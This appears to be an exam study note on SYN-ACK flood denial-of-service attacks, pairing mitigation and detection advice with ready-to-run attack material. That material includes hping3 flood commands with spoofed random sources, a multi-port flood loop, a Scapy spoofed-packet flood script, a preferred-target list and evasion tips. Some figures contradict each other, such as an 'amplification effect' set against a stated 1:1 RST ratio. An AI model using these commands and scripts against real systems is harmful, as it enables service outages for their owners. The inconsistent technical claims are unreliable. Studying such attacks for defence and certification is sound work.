# SYN-ACK Flood Attack

## üìç Attack Classification
- **Category**: Volumetric Attack / Connection State Exhaustion
- **OSI Layer**: Layer 4 (Transport)
- **Protocol**: TCP
- **Port**: Any TCP port (commonly 80, 443, 21, 22, 25)

## üéØ Attack Mechanism
Exploits **TCP SYN-ACK packets** to overwhelm targets by sending massive volumes of **unsolicited SYN-ACK responses** that force the target to process unexpected connection acknowledgments and generate RST packets.

### How it Works:
1. **SYN-ACK Generation**: Send high-volume SYN-ACK packets
2. **Unexpected Response**: Target receives ACKs for non-existent connections
3. **RST Generation**: Target responds with RST packets
4. **Resource Consumption**: CPU and memory exhaustion from processing

## üîç Key Characteristics
- **Unsolicited Responses**: SYN-ACKs without initial SYN requests
- **RST Storm**: Forces target to generate many RST responses
- **Connection Confusion**: Disrupts normal TCP state machine
- **Amplification Effect**: One SYN-ACK generates multiple responses

## üö® Exam Focus Points

### Critical Numbers:
- **TCP Window Size**: 1024-65,535 (often maximum)
- **Sequence Numbers**: Random initial values
- **Acknowledgment Numbers**: Random or incremental
- **Typical Rate**: 5,000-50,000+ SYN-ACK/sec
- **Packet Size**: 40-64 bytes per SYN-ACK

### Common Exam Questions:
- **Q**: How does a SYN-ACK flood differ from SYN flood?
- **A**: SYN-ACK flood sends responses without initial SYN requests
- **Q**: What TCP flags are set in SYN-ACK flood attacks?
- **A**: Both SYN and ACK flags are set
- **Q**: How does target respond to unexpected SYN-ACKs?
- **A**: Sends RST packets to terminate non-existent connections

### Attack Components:
- **SYN-ACK Packets**: TCP segments with SYN+ACK flags set
- **Random Sequence**: Non-sequential sequence numbers
- **Spoofed Sources**: Randomized source IP addresses
- **High Volume**: Sustained packet rates

## ‚ö° Attack Variations

### Pure SYN-ACK Flood:
- **Method**: Only SYN+ACK flags set
- **Impact**: RST generation, resource exhaustion
- **Detection**: Moderate difficulty

### SYN-ACK with Options:
- **Method**: SYN-ACK with TCP options (MSS, Window Scale)
- **Impact**: Higher processing overhead
- **Complexity**: More realistic connection mimicking

### Fragmented SYN-ACK Flood:
- **Method**: Fragmented SYN-ACK packets
- **Impact**: Reassembly resource consumption
- **Evasion**: May bypass simple filters

### Distributed SYN-ACK Flood:
- **Method**: Multiple sources simultaneously
- **Impact**: Massive scale attacks
- **Mitigation**: More difficult to block by source

## üõ°Ô∏è Detection & Mitigation
- **Network Protection**:
  - Connection state validation
  - SYN-ACK rate limiting per IP
  - Unexpected response detection
  - TCP sequence validation

- **Firewall Rules**:
  - Block unsolicited SYN-ACKs
  - Implement connection tracking
  - Rate limiting rules
  - Stateful inspection

### System Hardening:
```bash
# iptables SYN-ACK flood protection
iptables -A INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -m state --state NEW -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -m limit --limit 5/sec -j ACCEPT

# TCP tuning
echo 1 > /proc/sys/net/ipv4/tcp_syncookies
echo 5 > /proc/sys/net/ipv4/tcp_syn_retries
echo 3 > /proc/sys/net/ipv4/tcp_synack_retries
```

## üîß Attack Tools & Commands
- **hping3**: `hping3 -SA -p 80 --flood target`
- **Scapy**: Custom SYN-ACK flood scripts
- **Nping**: `nping --tcp -p 80 --flags SA target`
- **Nemesis**: `nemesis tcp -f SA -P 80 target`

### Manual Testing:
```bash
# Basic SYN-ACK flood
hping3 -SA -p 80 --flood -V target_ip

# Randomized SYN-ACK flood
hping3 -SA -p 80 --rand-source --flood target_ip

# Multiple port SYN-ACK flood
for port in {80,443,22,25}; do
  hping3 -SA -p $port --flood target_ip &
done

# Custom sequence numbers
hping3 -SA -p 80 -s 1000000000 --flood target_ip
```

## üí° Historical Context
- **Mid-1990s**: TCP state machine exploitation discovered
- **Early DDoS Era**: Used in multi-vector attacks
- **Modern Networks**: Still effective against unprotected systems
- **IoT Botnets**: Common in modern botnet arsenals

## üìä TCP Flood Comparison
| Attack Type | Flags | Resource Impact | Detection Difficulty |
|-------------|-------|-----------------|---------------------|
| SYN Flood | SYN | High | Easy |
| SYN-ACK Flood | SYN+ACK | Medium-High | Moderate |
| ACK Flood | ACK | Medium | Moderate |
| FIN Flood | FIN | Low-Medium | Easy |

## üéØ Target Selection
Preferred targets:
- **Web servers** with TCP services
- **Mail servers** (SMTP, POP3, IMAP)
- **Database servers** with network interfaces
- **Gaming servers** with TCP connections
- **VPN endpoints** processing TCP traffic

## ‚ö†Ô∏è Vulnerable Configurations
- **No connection validation**: Accept all SYN-ACKs
- **Weak rate limiting**: Unlimited packet processing
- **Poor logging**: Cannot detect unusual patterns
- **Default TCP settings**: No hardening applied

## üîç Detection Indicators
- **High SYN-ACK packet rates**
- **Increased RST packet generation**
- **CPU usage spikes**
- **Network bandwidth consumption**
- **Connection tracking table growth**

### Detection Commands:
```bash
# Monitor SYN-ACK packets
tcpdump -n 'tcp[tcpflags] == tcp-syn|tcp-ack'

# Check RST responses
tcpdump -n 'tcp[tcpflags] == tcp-rst' | wc -l

# Monitor connection states
ss -tuln | grep -c LISTEN

# CPU monitoring for TCP processing
top -p $(pgrep -f "tcp")

# Network statistics
netstat -s | grep -i tcp
```

## üåê Network Impact
- **Bandwidth Consumption**: Moderate to high
- **CPU Utilization**: High processing overhead
- **Connection Tracking**: State table pollution
- **Response Traffic**: RST packet generation increases outbound traffic

## üí° Defense Strategy
1. **Connection State Validation**: Ensure SYN-ACKs match existing connections
2. **Rate Limiting**: Limit SYN-ACK processing per source
3. **TCP Hardening**: Configure appropriate TCP parameters
4. **Monitoring**: Track unusual TCP flag combinations
5. **Firewall Rules**: Block unexpected SYN-ACK patterns

## üîß Verification Commands
```bash
# Test SYN-ACK handling
hping3 -SA -p 80 -c 1 target_ip

# Check connection state handling
nmap -sS -p 80 target_ip

# Monitor TCP connections
watch 'netstat -ant | grep -E "(SYN_|ESTABLISHED)" | wc -l'

# Firewall effectiveness
iptables -L -n -v | grep -E "(SYN|ACK)"
```

## üìà Attack Metrics
- **Packet Rate**: 3,000-30,000 SYN-ACK/sec
- **CPU Impact**: 30-70% utilization increase
- **Response Generation**: 1:1 RST ratio
- **Memory Usage**: Connection tracking overhead

## üîÑ Advanced Evasion
- **Realistic Sequences**: Use legitimate sequence ranges
- **TCP Options**: Add MSS, Window Scale, Timestamp options
- **Timing Variation**: Variable packet intervals
- **Mixed Attacks**: Combine with other TCP floods
- **Legitimate Mimicking**: Copy real server responses

## üî¨ Attack Analysis
### Scapy Script Example:
```python
from scapy.all import *
import random

def syn_ack_flood(target_ip, target_port, count=1000):
    for i in range(count):
        # Random source IP and port
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        
        # Create SYN-ACK packet
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=src_port, dport=target_port, 
                     flags="SA", seq=random.randint(1000000, 9000000),
                     ack=random.randint(1000000, 9000000))
        
        send(packet, verbose=0)

# Usage
syn_ack_flood("192.168.1.100", 80, 5000)
```

## üõ†Ô∏è Mitigation Best Practices
- **Stateful Firewalls**: Implement proper connection tracking
- **Intrusion Detection**: Monitor for unusual TCP patterns
- **Rate Limiting**: Apply per-source limits
- **TCP Stack Hardening**: Optimize kernel parameters
- **Load Balancers**: Distribute and filter traffic
